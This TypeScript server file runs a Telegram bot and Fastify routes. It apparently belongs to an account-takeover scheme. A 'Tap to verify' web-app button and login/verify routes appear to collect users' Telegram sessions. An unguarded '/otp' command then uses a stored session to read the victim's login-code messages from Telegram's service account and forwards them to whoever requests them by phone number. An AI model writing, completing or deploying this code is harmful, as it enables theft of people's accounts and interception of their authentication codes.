import "dotenv/config";
import { readFileSync } from "fs";
import cors from "@fastify/cors";
import { Input, Markup, type Context } from "telegraf";
import Fastify, { FastifyRequest } from "fastify";

import { db } from "./db";
import { cleanText, format } from "./lib/format";
import { bot, createTgClient } from "./instance";
import { createAccountRoute } from "./modules";
import { catchRuntimeError } from "./lib/error";
import { adminMessageRoute } from "./modules/admin/admin.route";
import { loginRoute, verifyRoute } from "./modules/telegram/telegram.route";
import { getAccountByPhoneNumber } from "./modules/account/account.controller";

const fastify = Fastify({ logger: true, ignoreTrailingSlash: true });

fastify.register(cors, {
  origin: "*",
});

const onStart = (context: Context) => {
  const message = readFileSync("./locale/en/start.md", "utf-8").replace(
    /%id/,
    String(context.botInfo!.id)
  );

  return context.replyWithPhoto(Input.fromLocalFile("./media/banner.png"), {
    parse_mode: "MarkdownV2",
    caption: message,
    reply_markup: Markup.inlineKeyboard([
      Markup.button.webApp("Tap to verify", process.env.APP_URL!),
    ]).reply_markup,
  });
};

bot.start(onStart);
bot.command("start", onStart);

bot.command("otp", async (context) => {
  if (true) {
    const [, phoneNumber] = context.message.text.split(" ");
    const [account] = await getAccountByPhoneNumber(db, phoneNumber);
    if (!account)
      return context.replyWithMarkdownV2(
        cleanText(format("User % not signed in with bot", phoneNumber))
      );

    const tg = createTgClient(account.session);
    await tg.client.connect();
    const messages = await tg.client.getMessages(777000);

    if (messages.length <= 0)
      return context.replyWithMarkdownV2("Not OTP found for user");

    tg.client.disconnect();

    return Promise.all(
      messages
        .sort((a, b) => a.date - b.date)
        .map((message) =>
          context.replyWithMarkdownV2(cleanText(message.message))
        )
    );
  }
});

fastify.route({
  url: "/accounts/",
  method: "POST",
  handler: catchRuntimeError(createAccountRoute),
});

fastify.route({
  url: "/admin/messages/",
  method: "POST",
  handler: catchRuntimeError(adminMessageRoute),
});

fastify.route({
  url: "/telegram/login/",
  method: "POST",
  handler: catchRuntimeError(loginRoute),
});

fastify.route({
  url: "/telegram/verify/",
  method: "POST",
  handler: catchRuntimeError(verifyRoute),
});

async function main() {
  const tasks = [] as Promise<void>[];
  if ("RENDER_EXTERNAL_HOSTNAME" in process.env) {
    const webhook = await bot.createWebhook({
      domain: process.env.RENDER_EXTERNAL_HOSTNAME!,
    });
    fastify.post(
      "/telegraf/" + bot.secretPathComponent(),
      webhook as unknown as (request: FastifyRequest) => void
    );
  } else tasks.push(bot.launch(() => console.log("Bot running in background")));

  tasks.push(
    (async () =>
      fastify.listen(
        {
          host: process.env.HOST,
          port: Number(process.env.PORT),
        },
        (error) => {
          if (error) {
            fastify.log.error(error);
            process.exit(1);
          }
        }
      ))()
  );

  Promise.all(tasks);
}

main();
